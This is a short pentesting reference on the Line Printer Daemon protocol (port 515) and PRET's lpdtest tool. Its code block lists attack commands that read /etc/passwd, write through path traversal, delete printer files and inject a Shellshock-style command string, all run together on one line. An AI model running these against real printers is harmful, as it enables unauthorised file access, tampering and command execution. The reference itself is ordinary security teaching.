# Line Printer Daemon (LPD) - 515

In the 1980s, Berkeley Unix introduced the Line Printer Daemon (LPD) protocol (later specified by RFC1179). The daemon is accessible via the **lpr** command and runs on port 515/tcp. To print, the client sends a control file that specifies the job/username and a data file that contains the actual data to be printed. The data file's input type can be specified in the control file by selecting one of several file formats. However, how the print data is handled is up to the LPD implementation. LPRng is a popular LPD implementation for Unix-like operating systems. LPD can be used to deliver malicious PostScript or PJL print jobs.

PRET includes the lpdprint and lpdtest tools. They are a simple way to print data directly to an LPD printer or to download/upload/delete files, among other things:

```
lpdprint.py hostname filenamelpdtest.py hostname get /etc/passwdlpdtest.py hostname put ../../etc/passwdlpdtest.py hostname rm /some/file/on/printerlpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'lpdtest.py hostname mail lpdtest@mailhost.local
```

